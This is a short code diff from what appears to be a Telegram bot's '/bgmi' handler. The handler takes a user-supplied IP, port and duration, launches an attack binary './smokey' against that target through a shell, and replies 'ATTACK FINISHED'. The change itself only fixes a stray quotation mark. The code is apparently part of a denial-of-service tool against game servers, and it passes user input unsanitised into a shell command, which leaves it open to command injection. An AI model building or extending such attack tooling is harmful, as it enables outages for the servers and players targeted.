@@ -227,7 +227,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, ip, port, time)  
                 full_command = f"./smokey {ip} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
-                response = f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 🚀\n\n𝗬𝗢𝗨 𝗖𝗔𝗡 𝗦𝗧𝗔𝗥𝗧 𝗔𝗡𝗢𝗧𝗛𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗢𝗪⚠️""
+                response = f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 🚀\n\n𝗬𝗢𝗨 𝗖𝗔𝗡 𝗦𝗧𝗔𝗥𝗧 𝗔𝗡𝗢𝗧𝗛𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗢𝗪⚠️"
         else:
             response = "✅ Currently Available: /bgmi <ip> <port> <time>"  
     else:
